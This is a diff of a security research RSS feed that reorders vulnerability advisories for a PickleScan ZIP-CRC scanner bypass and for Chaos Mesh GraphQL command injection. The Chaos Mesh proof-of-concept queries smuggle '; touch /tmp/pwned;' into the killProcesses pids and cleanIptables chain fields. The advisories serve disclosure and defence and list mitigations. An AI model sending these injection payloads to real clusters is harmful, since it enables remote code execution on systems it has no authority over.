@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Wed, 04 Nov 2026 00:24:27 GMT</lastBuildDate>
+        <lastBuildDate>Thu, 05 Nov 2026 00:24:39 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -2823,6 +2823,56 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
+
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
+
+## PoC
+
+The following steps demonstrate the vulnerability using a public model with a known CRC error.
+
+```bash
+# 1. Download a Pytorch model known to have a bad CRC.
+wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
+
+# 2. Attempt to scan the corrupted ZIP file with PickleScan.
+picklescan -p pytorch_model.bin
+
+# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
+
+# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PickleScan Bypass via File Extension Mismatch]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</guid>
@@ -2873,56 +2923,6 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-jgw4-cr84-mqxg)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10155)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
-
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
-
-## PoC
-
-The following steps demonstrate the vulnerability using a public model with a known CRC error.
-
-```bash
-# 1. Download a Pytorch model known to have a bad CRC.
-wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
-
-# 2. Attempt to scan the corrupted ZIP file with PickleScan.
-picklescan -p pytorch_model.bin
-
-# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
-
-# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
 ]]></content:encoded>
         </item>
         <item>
@@ -3029,59 +3029,6 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59360, CRITICAL, OS command injection in Chaos Mesh via the killProcesses mutation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-OS command injection in Chaos Mesh via the killProcesses mutation
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The killProcesses mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
-
-
-## PoC
-
-```shell
-{"query": "mutation KillProcessesInPod { 
-pod(ns: \"kube-system\", name: \"kube-proxy-9trk4\") { 
-killProcesses(pids: [\"1\","; touch /tmp/pwned;"]) { 
-pid command } } }
-```
-
-
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Chaos Mesh cleanIptables command injection]]></title>
             <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</link>
             <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</guid>
@@ -3114,6 +3061,59 @@ pod(ns: \"chaos-mesh\", name: \"chaos-dashboard-5c6575bd9f-b5tqg\") {
  cleanIptables(chains: [\"INPUT;touch /tmp/pwned; \", \"OUTPUT\", \"FORWARD\", \"CHAOS-MESH-INPUT\", \"CHAOS-MESH-OUTPUT\"])
  }
  }"}' http://controller-manager-host:10082/query
+```
+
+
+
+## Vulnerability Mitigations
+
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
+
+
+
+## References
+
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-59360, CRITICAL, OS command injection in Chaos Mesh via the killProcesses mutation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+OS command injection in Chaos Mesh via the killProcesses mutation
+
+## Component
+
+github.com/chaos-mesh/chaos-mesh
+
+## Affected versions
+
+(,2.7.2]
+
+## Description
+
+The killProcesses mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
+
+
+## PoC
+
+```shell
+{"query": "mutation KillProcessesInPod { 
+pod(ns: \"kube-system\", name: \"kube-proxy-9trk4\") { 
+killProcesses(pids: [\"1\","; touch /tmp/pwned;"]) { 
+pid command } } }
 ```
 
 
